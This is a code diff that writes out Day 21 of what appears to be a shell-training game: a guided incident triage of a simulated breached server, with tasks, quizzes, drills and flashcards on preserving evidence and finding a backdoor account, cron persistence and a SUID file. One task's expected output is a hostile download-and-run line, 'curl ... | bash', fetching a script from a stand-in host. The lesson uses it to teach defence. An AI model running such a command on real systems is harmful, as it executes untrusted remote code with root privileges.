@@ -100,7 +100,7 @@ defineFixture('day21', (vfs) => {
   homeDir(vfs, 'reports');
 });
 
-/* --------------------------------------------------------------- mission (placeholder) */
+/* ------------------------------------------------------------------ mission */
 export const day21: Mission = {
   day: 21,
   week: 3,
@@ -109,12 +109,218 @@ export const day21: Mission = {
   minutes: 45,
   fixture: 'day21',
   caseId: 'capstone',
-  briefing: 'placeholder',
-  objectives: ['a', 'b', 'c', 'd'],
+  briefing: `Saturday, 08:10. The web proxy blocked **web03** trying to fetch a script from a host nobody here has heard of. Networking has already cut web03 off from everything but your workstation.
+
+I’m on a plane until this afternoon, so this one is yours. No new commands today — you have everything you need. A triage is just the last three weeks in the right order: who got in, what they changed, what they left behind to come back, and what it all means.
+
+Work through web03 with me by hand this morning. Then write the script that does it for you, on any server, in two seconds. That’s the capstone, and it’s what makes you a Lead Analyst.`,
+  objectives: ['Run a triage in the right order: contain, preserve, investigate, report', 'Answer “who got in?” from auth.log', 'Find the accounts, cron jobs and files the attacker left behind', 'Record the evidence — and decode, never run, what you find'],
   lesson: [
-    { kind: 'task', id: 'tmp', md: 'tmp', check: { output: 'web03\n' }, solution: 'hostname', hints: ['hostname'] },
+    {
+      kind: 'read',
+      id: 'order',
+      title: 'Triage, in order',
+      md: `Every incident gets the same four moves, **in this order**:
+
+1. **Contain** — stop the damage. (Done: web03 is isolated.)
+2. **Preserve** — copy the evidence before you touch anything. Every “quick fix” destroys a clue.
+3. **Investigate** — answer the questions below, one at a time.
+4. **Report** — write it down so the next person can act.
+
+| Question | Where it lives | Your tool (day) |
+|---|---|---|
+| Who got in? | \`/var/log/auth.log\` | the brute-force pipeline (14) |
+| Which accounts are new? | \`/etc/passwd\` | \`awk -F:\` (11, 18) |
+| How will they come back? | \`/etc/cron.d/\` | \`grep -Eo\` + \`base64 -d\` (13, 16) |
+| What did they change? | \`/usr/local/bin\` | the baseline (20) |
+| What did they open up? | the whole disk | \`find -perm\` (18) |`,
+    },
+    {
+      kind: 'quiz',
+      id: 'q-first',
+      q: 'You spot a malicious-looking cron job on web03. What do you do first?',
+      options: ['Delete it before it runs again', 'Copy it, and note the time you found it', 'Run it once to see what it does', 'Reboot the server'],
+      answer: 1,
+      explain: 'The box is already contained, so nothing is lost by waiting a minute. Preserve first: once you delete or run it, the evidence — and its timestamps — are gone.',
+    },
+    {
+      kind: 'task',
+      id: 'whereami',
+      md: 'Before anything else, confirm where you are and who you are. Print `USER@HOST` using `$(whoami)` and `$(hostname)`.',
+      check: { output: 'analyst@web03\n', nodes: ['cmdsub'] },
+      solution: 'echo "$(whoami)@$(hostname)"',
+      hints: ['`echo "$(whoami)@$(hostname)"`'],
+      explain: 'It sounds silly. It isn’t. Analysts have “cleaned up” the wrong server before.',
+    },
+    {
+      kind: 'task',
+      id: 'preserve',
+      md: 'Preserve. Make `~/evidence/web03`, then copy `/var/log/auth.log` and `/etc/passwd` into it with `cp -p` (keeps the timestamps), and copy the whole `/etc/cron.d` folder with `cp -rp`.',
+      check: { fs: [{ path: '~/evidence/web03/auth.log', type: 'file' }, { path: '~/evidence/web03/passwd', contains: 'sysadm' }, { path: '~/evidence/web03/cron.d/apache-health', contains: 'base64' }] },
+      solution: 'mkdir -p ~/evidence/web03 && cp -p /var/log/auth.log /etc/passwd ~/evidence/web03/ && cp -rp /etc/cron.d ~/evidence/web03/',
+      hints: ['Three commands joined with `&&`: `mkdir -p`, `cp -p FILE FILE DIR/`, `cp -rp DIR DIR/`.'],
+      explain: 'Real responders also hash the copies (`sha256sum`) so they can prove later that nobody altered them.',
+    },
+    {
+      kind: 'task',
+      id: 'failed',
+      md: '**Who got in?** Rank the source IPs of the `Failed password` lines, worst first, top 3 — your Day 14 pipeline.',
+      check: { output: 'reference', uses: ['grep', 'awk', 'sort', 'uniq'] },
+      solution: "grep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -3",
+      hints: ["`grep \"Failed password\" FILE | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -3`"],
+    },
+    {
+      kind: 'task',
+      id: 'accepted',
+      md: 'Now the question that matters: show every **successful password** login.',
+      check: { output: 'reference', uses: ['grep'] },
+      solution: 'grep "Accepted password" /var/log/auth.log',
+      hints: ['`grep "Accepted password" /var/log/auth.log`'],
+      explain: 'Same IP, a few minutes after 25 failures: `deploy` — a real service account with a weak password. That’s the way in.',
+    },
+    {
+      kind: 'task',
+      id: 'uid0',
+      md: '**Which accounts are new?** List every account with UID 0.',
+      check: { output: 'reference', uses: ['awk'] },
+      solution: "awk -F: '$3 == 0 {print $1}' /etc/passwd",
+      hints: ["`awk -F: '$3 == 0 {print $1}' /etc/passwd`"],
+      explain: '`sysadm` has UID 0: it *is* root, under a name that looks routine. A classic backdoor.',
+    },
+    {
+      kind: 'task',
+      id: 'unapproved',
+      md: 'Compare the accounts that have a login shell with the approved list in `~/triage/approved_users.txt`. Print the shell accounts that are **not** on it.\n\n`grep -vxFf LIST` keeps lines that are not (`-v`) an exact whole-line (`-x`) match for any fixed string (`-F`) in the file LIST (`-f`).',
+      check: { output: 'sysadm\n', uses: ['awk', 'grep'] },
+      solution: "awk -F: '$7 ~ /sh$/ {print $1}' /etc/passwd | grep -vxFf ~/triage/approved_users.txt",
+      hints: ["Shell accounts: `awk -F: '$7 ~ /sh$/ {print $1}' /etc/passwd`", 'Then `| grep -vxFf ~/triage/approved_users.txt`.'],
+    },
+    {
+      kind: 'task',
+      id: 'cronfind',
+      md: '**How will they come back?** Which files in `/etc/cron.d` mention `base64`? Print just the filenames (`grep -l`).',
+      check: { output: '/etc/cron.d/apache-health\n', uses: ['grep'] },
+      solution: 'grep -l base64 /etc/cron.d/*',
+      hints: ['`grep -l PATTERN FILES` lists the matching files instead of the lines.'],
+    },
+    {
+      kind: 'task',
+      id: 'decode',
+      md: 'Extract the base64 blob from that file and decode it. **Decode to read — never pipe it to bash.**',
+      check: { output: 'curl -s http://mirror.updates.example/setup.sh | bash\n', uses: ['base64'] },
+      solution: "grep -Eo '[A-Za-z0-9+/]{20,}={0,2}' /etc/cron.d/apache-health | base64 -d",
+      hints: ["The Day 16 regex: `grep -Eo '[A-Za-z0-9+/]{20,}={0,2}' FILE`", 'Then `| base64 -d`.'],
+      explain: 'Every 15 minutes, as root, web03 downloads and runs whatever that host serves. That’s the request the proxy blocked this morning. Two clues, one story.',
+    },
+    {
+      kind: 'task',
+      id: 'integrity',
+      md: '**What did they change?** On Thursday we saved a baseline of `/usr/local/bin` in `~/triage/baseline.sha256`. Check today’s files against it.',
+      check: { output: 'reference', uses: ['sha256sum'], status: 1 },
+      solution: 'sha256sum -c ~/triage/baseline.sha256',
+      hints: ['`sha256sum -c BASELINE`'],
+      explain: '`backup.sh` changed — and it runs nightly as root. Let’s see what else is in that folder that the baseline doesn’t know about.',
+    },
+    {
+      kind: 'quiz',
+      id: 'q-hidden',
+      q: '`sha256sum -c` only checks the files *in* the baseline. Why might `ls /usr/local/bin` also miss a file the attacker added?',
+      options: ['ls only shows executable files', 'The name starts with a dot, so ls hides it without -a', 'ls can’t read a SUID file', 'New files take a minute to appear'],
+      answer: 1,
+      explain: 'Dotfiles are hidden from `ls` and from `*` globs. `ls -a` or `find` sees them.',
+    },
+    {
+      kind: 'task',
+      id: 'added',
+      md: 'Find the files in `/usr/local/bin` that are **not** in the baseline. Compare two sorted lists with `comm -13` — the paths from the baseline (from character 67 on) and what `find` sees today:\n\n```bash\ncomm -13 <(cut -c 67- ~/triage/baseline.sha256 | sort) <(find /usr/local/bin -type f | sort)\n```',
+      check: { output: '/usr/local/bin/.helper\n', uses: ['comm'] },
+      solution: 'comm -13 <(cut -c 67- ~/triage/baseline.sha256 | sort) <(find /usr/local/bin -type f | sort)',
+      hints: ['Type the command shown.', '`comm -13 A B` prints the lines only in B.'],
+    },
+    {
+      kind: 'task',
+      id: 'suid',
+      md: '**What did they open up?** List every SUID file on the machine, sorted. Use `sudo` so no folder is skipped.',
+      check: { output: 'reference', uses: ['find', 'sudo'] },
+      solution: 'sudo find / -type f -perm -4000 2>/dev/null | sort',
+      hints: ['`sudo find / -type f -perm -4000 2>/dev/null | sort`'],
+      explain: '`.helper` again — hidden, added after the baseline, and SUID root. Whatever it is, it runs with root’s power for anyone who starts it. Don’t.',
+    },
+    {
+      kind: 'task',
+      id: 'notes',
+      md: 'Report. Write your notes to `~/reports/web03-notes.txt` with a heredoc: one line each for the way in (`192.0.2.150` as `deploy`), the backdoor account (`sysadm`), the cron payload file (`/etc/cron.d/apache-health`) and the dropped binary (`/usr/local/bin/.helper`).',
+      check: { fs: [{ path: '~/reports/web03-notes.txt', contains: '192.0.2.150' }, { path: '~/reports/web03-notes.txt', contains: 'sysadm' }, { path: '~/reports/web03-notes.txt', contains: 'apache-health' }, { path: '~/reports/web03-notes.txt', contains: '.helper' }] },
+      solution: `cat > ~/reports/web03-notes.txt <<'EOF'
+web03 triage - Sat 14 Mar
+way in: 192.0.2.150 brute-forced and logged in as deploy
+backdoor: sysadm (UID 0)
+persistence: /etc/cron.d/apache-health downloads and runs a script every 15 min
+dropped: /usr/local/bin/.helper (SUID root); backup.sh modified
+EOF`,
+      hints: ["`cat > ~/reports/web03-notes.txt <<'EOF'` then your lines, then `EOF` on its own line."],
+      explain: 'That’s a real triage, start to finish. You did it with tools you’ve had for weeks. Now make the machine do it.',
+    },
+    {
+      kind: 'read',
+      id: 'handoff',
+      title: 'Now automate it',
+      md: `Everything you just typed, in order, is a script waiting to happen. The capstone, **Incident Triage**, asks for exactly that: one command that examines any server and writes the report — logins, accounts, persistence, integrity, permissions and a verdict.
+
+I’ll run your script on web03, on a clean twin from before the attack, and on a box that was hit differently. Read the machine; don’t hard-code what you found here.
+
+When it passes, you’re a Lead Analyst. I mean that.
+
+— Mara`,
+    },
   ],
-  drills: [],
-  debrief: { summary: ['x'], cards: [] },
-  cards: [],
+  drills: [
+    {
+      kind: 'task',
+      id: 'd-world',
+      md: '**Drill 1.** List the world-writable regular files under `/etc /usr /var /home` (with `sudo`, errors hidden).',
+      check: { output: '/etc/profile.d/proxy.sh\n', uses: ['find'] },
+      solution: 'sudo find /etc /usr /var /home -type f -perm -0002 2>/dev/null',
+      hints: ['`-type f -perm -0002`'],
+      explain: 'Every login shell on web03 sources that file. Anyone could have put a line in it.',
+    },
+    {
+      kind: 'task',
+      id: 'd-when',
+      md: '**Drill 2.** When were `backup.sh` and `.helper` last modified? Show both with `stat -c \'%y %n\'`.',
+      check: { output: 'reference', uses: ['stat'] },
+      solution: "stat -c '%y %n' /usr/local/bin/backup.sh /usr/local/bin/.helper",
+      hints: ["`stat -c '%y %n' FILE FILE`"],
+      explain: 'Both at 06:34 — three minutes after `deploy` logged in from 192.0.2.150. That’s your timeline’s key line.',
+    },
+    {
+      kind: 'task',
+      id: 'd-strings',
+      md: '**Drill 3.** Look inside `.helper` **without running it**: print its readable text with `strings`.',
+      check: { output: 'reference', uses: ['strings'] },
+      solution: 'strings /usr/local/bin/.helper',
+      hints: ['`strings FILE` prints the runs of readable characters in any file.'],
+      explain: 'In a real case you would hash it and hand it to the malware team, never execute it. (This one is an inert training sample.)',
+    },
+  ],
+  debrief: {
+    summary: [
+      'Triage order: contain, preserve, investigate, report. Copy evidence before you change anything.',
+      'Who got in: rank failed logins per IP, then look for an `Accepted` line from the same IP.',
+      'What they left: UID-0 and unapproved accounts, base64 cron payloads (decode, never run), files that differ from the baseline, unexpected SUID files.',
+      '`grep -vxFf LIST` finds lines not in a list; `comm -13 <(…) <(…)` finds what is new.',
+      'The capstone, Incident Triage, is open. Close it to make Lead Analyst.',
+    ],
+    cards: ['c-d21-order', 'c-d21-preserve', 'c-d21-who', 'c-d21-grepvxf', 'c-d21-comm', 'c-d21-cron', 'c-d21-suid', 'c-d21-never-run'],
+  },
+  cards: [
+    { id: 'c-d21-order', day: 21, tag: 'incident response', front: 'The four moves of every incident, in order?', back: 'Contain, preserve, investigate, report.' },
+    { id: 'c-d21-preserve', day: 21, tag: 'incident response', front: 'Why preserve evidence before fixing anything?', back: 'Deleting, running or editing a file destroys it and its timestamps. Copy it (`cp -p`), note the time, then act.' },
+    { id: 'c-d21-who', day: 21, tag: 'incident response', front: 'How do you prove a brute force succeeded?', back: 'Many `Failed password` lines from one IP, then an `Accepted` line from the same IP.' },
+    { id: 'c-d21-grepvxf', day: 21, tag: 'grep', front: 'Print the names in `found.txt` that are NOT in `approved.txt`?', back: '`grep -vxFf approved.txt found.txt` — invert, whole line, fixed strings, patterns from a file.' },
+    { id: 'c-d21-comm', day: 21, tag: 'integrity', front: 'Lines only in the second of two sorted lists?', back: '`comm -13 <(sort a) <(sort b)` (`-23` gives lines only in the first).' },
+    { id: 'c-d21-cron', day: 21, tag: 'incident response', front: 'Where do attackers often hide a way back in?', back: 'Cron: `/etc/cron.d/`, `/etc/crontab` and user crontabs, often with a base64-encoded download-and-run line.' },
+    { id: 'c-d21-suid', day: 21, tag: 'auditing', front: 'Why is an unknown SUID-root file an emergency?', back: 'Anyone who runs it gets root’s power. Find them with `sudo find / -type f -perm -4000`.' },
+    { id: 'c-d21-never-run', day: 21, tag: 'incident response', front: 'You decoded a suspicious payload. What next?', back: 'Record it as evidence. Never run it — read it with `base64 -d`, `strings` or `xxd` only.' },
+  ],
 };
